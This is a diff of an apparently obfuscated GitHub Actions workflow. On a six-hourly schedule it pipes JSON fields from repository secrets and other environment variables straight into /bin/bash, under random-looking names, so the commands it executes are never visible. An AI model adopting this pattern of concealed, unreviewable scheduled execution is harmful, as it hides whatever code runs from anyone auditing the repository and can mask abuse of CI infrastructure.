@@ -3,8 +3,7 @@ name: gechundan5678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 0/6 * * *'
-
+    - cron: '9 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,15 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: gechundan5678
         env:
-          dimsh8408: ${{ secrets.dimsh8408 }}
+          qo8794: ${{ secrets.qo8794 }}
         run: |
-          echo $dimsh8408 | jq -r .zbo110 | /bin/bash
-          echo $ym00005 | jq -r .yj3404 | /bin/bash
-          echo $jf3418 | jq -r .wt60592 | /bin/bash
-          echo $udkh33 | jq -r .sv50 | /bin/bash
-          echo $kpnn88634 | jq -r .ymgl2 | /bin/bash
-          echo $ns8 | jq -r .iqcax613 | /bin/bash
-          echo $alp0 | jq -r .w7 | /bin/bash
-          echo $bnz630 | jq -r .p84 | /bin/bash
-          echo $drml491 | jq -r .gd261 | /bin/bash
+          echo $qo8794 | jq -r .xed11696 | /bin/bash
+          echo $k1306 | jq -r .y494 | /bin/bash
+          echo $n40 | jq -r .w8 | /bin/bash
+          echo $lth38965 | jq -r .afmo6 | /bin/bash
+          echo $eihun87233 | jq -r .m29 | /bin/bash
+          echo $szx89 | jq -r .krx0346 | /bin/bash
+          echo $tlix9 | jq -r .y44 | /bin/bash
 
